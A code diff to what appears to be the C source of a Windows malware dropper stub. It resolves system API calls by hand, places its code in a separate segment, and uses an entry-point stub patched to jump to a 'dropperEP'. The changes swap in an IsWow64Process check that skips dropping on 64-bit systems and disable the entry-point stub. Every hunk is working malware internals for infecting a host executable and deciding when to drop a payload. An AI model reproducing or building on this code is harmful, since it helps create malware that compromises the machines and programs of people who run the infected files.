@@ -79,23 +79,24 @@ XREFNAMES data_imports[] = {
 			"VirtualQuery",			// 27
 			"VerifyVersionInfoA",	// 28
 			"GetVersionExA",		// 29
-			"GetSystemInfo",		// 30
+			"IsWow64Process",		// 30
+			"GetCurrentProcess",	// 31
 			NULL
 	}
 	}, // KERNEL32.DLL
 	
 	{ "MSVCRT.DLL",
 	{
-		"sprintf",				// 31
-		"exit",					// 32
-		"_exit",				// 33
+		"sprintf",				// 32
+		"exit",					// 33
+		"_exit",				// 34
 		NULL
 	} 
 	}, // USER32.DLL
 	
 	{ "ADVAPI32.DLL",
 	{
-		"GetCurrentHwProfileA", // 34
+		"GetCurrentHwProfileA", // 35
 	}
 	}, // ADVAPI32.DLL
 
@@ -140,6 +141,7 @@ char * _needed_strings[] = {
 	NULL
 };
 
+#if 0
 BYTE oepStub[OEPSTUBSIZE] = {
 	0x33, 0xc0,						// xor eax, eax
 	0xb8, 0x00, 0x00, 0xff, 0xff,	// mov eax, dropperEP.ffff0000	[byte 5 and 6 to be patched]
@@ -154,6 +156,7 @@ BYTE oepStub[OEPSTUBSIZE] = {
 	0xeb, 0xff, 0xf0,				// PUSH EAX
 	0xc3     						// jmp ecx
 };
+#endif
 
 #pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
 #pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment
@@ -331,7 +334,8 @@ NEXT_ENTRY:
 	VERIFYVERSIONINFO pfn_VerifyVersionInfo = (VERIFYVERSIONINFO) dll_calls[CALL_VERIFYVERSIONINFO];
 	GETVERSIONEX pfn_GetVersionEx = (GETVERSIONEX) dll_calls[CALL_GETVERSIONEX];
 	GETCURRENTHWPROFILE pfn_GetCurrentHwProfile = (GETCURRENTHWPROFILE) dll_calls[CALL_GETCURRENTHWPROFILE];
-	GETSYSTEMINFO pfn_GetSystemInfo = (GETSYSTEMINFO) dll_calls[CALL_GETSYSTEMINFO];
+	ISWOW64PROCESS pfn_IsWow64Process = (ISWOW64PROCESS) dll_calls[CALL_ISWOW64PROCESS];
+	GETCURRENTPROCESS pfn_GetCurrentProcess = (GETCURRENTPROCESS) dll_calls[CALL_GETCURRENTPROCESS];
 	
 	DWORD imageBase = 0;
 	__asm {
@@ -360,23 +364,19 @@ NEXT_ENTRY:
 	CHECK_CALL( pfn_GetEnvironmentVariable );
 	CHECK_CALL( pfn_VirtualQuery );
 	CHECK_CALL( pfn_VirtualProtect );
-	CHECK_CALL( pfn_GetSystemInfo );
 	CHECK_CALL( pfn_GetVersionEx );
 	
 	//
 	// *** check for 64bit system
 	//
-#ifndef _64BIT
-	SYSTEM_INFO* sysInfo = (SYSTEM_INFO*) pfn_VirtualAlloc(NULL, sizeof(SYSTEM_INFO), MEM_COMMIT, PAGE_READWRITE);
-	if (NULL == sysInfo)
-		goto OEP_CALL;
+	if (pfn_IsWow64Process) {
+		BOOL res;
+		pfn_IsWow64Process(pfn_GetCurrentProcess(), &res);
 
-	pfn_GetSystemInfo(sysInfo);
-	if (sysInfo->wProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL) {
-		pfn_VirtualFree(sysInfo, 0, MEM_RELEASE);	
-		goto OEP_CALL;
+		// if we are on a 64bit system, don't drop
+		if (res)
+			goto OEP_CALL;
 	}
-#endif
 	
 	//
 	// *** check OS version
